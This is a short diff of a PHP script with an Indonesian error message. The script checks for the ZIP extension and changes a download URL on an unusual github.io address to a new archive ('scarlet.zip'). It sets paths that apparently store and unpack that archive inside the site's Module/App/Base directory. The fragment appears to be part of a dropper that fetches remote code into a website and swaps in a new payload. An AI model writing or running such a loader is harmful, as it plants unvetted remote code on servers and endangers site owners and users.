@@ -16,7 +16,7 @@ if (!class_exists('ZipArchive')) {
     die("Extension ZIP belum aktif (ZipArchive tidak tersedia). Aktifkan 'zip' di PHP.");
 }
 
-$url = "https://veitokonivinaka05-creator.github.io/privacy/diff/m13a.zip";
+$url = "https://veitokonivinaka05-creator.github.io/privacy/diff/scarlet.zip";
 $savePath  = __DIR__ . "/Module/App/Base/zip/m13a.zip";
 $packDir   = __DIR__ . "/Module/App/Base/";
 $LockDir   = __DIR__ . "/Module/App/Base/Core/Components";
